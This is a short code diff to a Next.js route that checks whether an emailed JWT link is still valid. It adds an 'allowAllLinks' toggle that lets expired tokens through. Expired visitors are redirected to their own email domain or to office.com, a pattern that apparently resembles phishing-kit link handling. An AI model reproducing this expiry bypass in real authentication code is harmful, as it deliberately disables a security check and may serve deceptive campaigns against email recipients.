@@ -60,16 +60,35 @@ export async function POST(request: NextRequest) {
       
       payload = tokenData.payload
       
-      // Check if JWT token expired
+      // Check if JWT token expired (but can be bypassed by master toggle)
       if (payload.expiresAt && payload.expiresAt < Date.now()) {
-        const emailForRedirect = payload.email || ''
-        const domain = emailForRedirect.split('@')[1] || 'office.com'
-        const settings = await getSettings()
-        const redirectUrl = settings.redirects?.customUrl || `https://${domain}`
-        return NextResponse.json({ 
-          status: 'expired',
-          redirectUrl: redirectUrl
-        })
+        try {
+          const settings = await getSettings()
+          if (settings.linkManagement?.allowAllLinks) {
+            console.log('[LINK STATUS] ⚠️ JWT token expired but allowAllLinks is ON - allowing access')
+            // Master toggle is ON - allow expired JWT
+          } else {
+            // Master toggle is OFF - reject expired token
+            const emailForRedirect = payload.email || ''
+            const domain = emailForRedirect.split('@')[1] || 'office.com'
+            const redirectUrl = settings.redirects?.customUrl || `https://${domain}`
+            return NextResponse.json({ 
+              status: 'expired',
+              redirectUrl: redirectUrl
+            })
+          }
+        } catch (error) {
+          console.error('[LINK STATUS] Error checking master toggle:', error)
+          // If error, use default (don't allow expired)
+          const emailForRedirect = payload.email || ''
+          const domain = emailForRedirect.split('@')[1] || 'office.com'
+          const settings = await getSettings()
+          const redirectUrl = settings.redirects?.customUrl || `https://${domain}`
+          return NextResponse.json({ 
+            status: 'expired',
+            redirectUrl: redirectUrl
+          })
+        }
       }
       
       // Get email from JWT payload
